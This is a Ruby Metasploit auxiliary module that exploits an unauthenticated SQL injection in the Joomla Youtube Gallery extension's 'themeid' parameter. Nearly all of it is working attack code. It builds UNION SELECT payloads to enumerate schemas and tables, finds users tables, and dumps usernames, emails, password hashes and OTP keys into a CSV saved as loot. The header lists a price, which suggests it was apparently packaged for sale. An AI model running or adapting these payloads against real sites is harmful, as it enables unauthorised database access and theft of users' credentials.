##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##


require 'msf/core'


class MetasploitModule < Msf::Auxiliary

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Joomla Youtube Gallery Unauthenticated SQLi User Enumeration',
      'Description'    => %q{This module enumerates Joomla usernames and passwords hashes from the vulnerable instance.

      This module exploits an unauthenticated SQL injection in Joomla Youtube Gallery
      in order to enumerate the users table in the database. Tested against version 4.1.7.

      Categories: Joomla, SQL Injection

      Price: 2

      Video: none

      OS: Multi

      Arch: Multi

      Requirements: Metasploit Framework
      },
      'License'        => 'VolatileMinds',
      'Author'         =>
        [
          'bperry'
        ],
      'References'     =>
        [
          ['URL', 'http://www.exploit-db.com/exploits/34087/']
        ],
      'DisclosureDate' => 'Jul 16 2014'
    ))

    register_options(
      [
        OptString.new('TARGETURI', [ true, "Base Joomla directory path", '/']),
      ], self.class)

  end

  def marker
    return Rex::Text.rand_text_alpha(6)
  end

  def send_injected_request(payload)
     get = {
       'option' => 'com_youtubegallery',
       'view' => 'youtubegallery',
       'listid' => '1',
       'themeid' => payload,
       'videoid' => Rex::Text.rand_text_alpha(10),
       'tmpl' => 'component',
       'TB_iframe' => 'true',
       'height' => 500,
       'width' => 700
     }

     return send_request_cgi({
       'uri' => normalize_uri(target_uri.path, 'index.php'),
       'vars_get' => get
     })
  end

  def check
    left_marker = marker
    right_marker = marker

    test = Rex::Text.rand_text_alpha(10)

    payload = "-9524 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},0x#{test.unpack("H*")[0]},0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

    res = send_injected_request(payload)

    if res and res.body =~ /#{left_marker}(.*)#{right_marker}/ and $1 == test
      return Exploit::CheckCode::Vulnerable
    end

    return Exploit::CheckCode::Safe
  end

  def run
    return unless check == Exploit::CheckCode::Vulnerable

    left_marker = marker
    right_marker = marker

    schema_count = "-7427 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(schema_name) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.SCHEMATA#"

    res = send_injected_request(schema_count)

    schema_count = $1.to_i if res and res.body =~ /#{left_marker}(.*)#{right_marker}/

    print_status("Found #{schema_count} schemas")

    schemas = []
    0.upto(schema_count-1) do |i|
      get_schema = "-5620 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(schema_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.SCHEMATA LIMIT #{i},1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

      res = send_injected_request(get_schema)

      schemas << $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
    end

    schemas.delete('information_schema')
    schemas.delete('performance_schema')
    schemas.delete('mysql')

    csv = ''
    schemas.each do |schema|
      print_status("Looking for users table in schema #{schema}")

      get_table_count = "-3561 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(table_name) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{schema.unpack("H*")[0]})#"

      res = send_injected_request(get_table_count)

      table_count = $1.to_i if res and res.body =~ /#{left_marker}(.*)#{right_marker}/

      tables = []
      0.upto(table_count-1) do |i|
        get_table = "-1107 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(table_name AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}) FROM INFORMATION_SCHEMA.TABLES WHERE table_schema IN (0x#{schema.unpack("H*")[0]}) LIMIT #{i},1),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

        res = send_injected_request(get_table)

        table = $1 if res and res.body =~ /#{left_marker}(.*)#{right_marker}/
        tables << table if table =~ /users$/
      end

      tables.each do |table|
        print_status("Found users table #{table}, enumerating...")

        cols = ["activation", "block", "email", "id", "lastResetTime", "lastVisitDate", "name", "otep", "otpKey", "params", "password", "registerDate", "requireReset", "resetCount", "sendEmail", "username"]

        get_user_count = "-9010 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,CONCAT(0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(COUNT(*) AS CHAR),0x20),0x#{right_marker.unpack("H*")[0]}),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL FROM #{schema}.#{table}#"

        res = send_injected_request(get_user_count)

        user_count = $1.to_i if res and res.body =~ /#{left_marker}(.*)#{right_marker}/

        0.upto(user_count-1) do |i|
          payload = "-2804 UNION ALL SELECT NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,(SELECT CONCAT("

          cols.each do |col|
            payload << "0x#{left_marker.unpack("H*")[0]},IFNULL(CAST(#{col} AS CHAR),0x20),"
          end

          payload << "0x#{right_marker.unpack("H*")[0]}) FROM #{schema}.#{table} LIMIT #{i},1),"
          payload << "NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL#"

          res = send_injected_request(payload)

          regex = ""
          cols.each do |col|
            csv << col + ","
            regex << left_marker + "(.*?)"
          end

          csv << "\n"
          regex << right_marker

          matches = /#{regex}/.match(res.body)

          matches.captures.each do |cap|
            csv << cap + ","
          end

          csv << "\n"
        end
      end
    end

    path = store_loot('joomla.users', 'text/plain', datastore['RHOST'], csv)

    print_good("Users CSV saved to: " + path)
  end
end

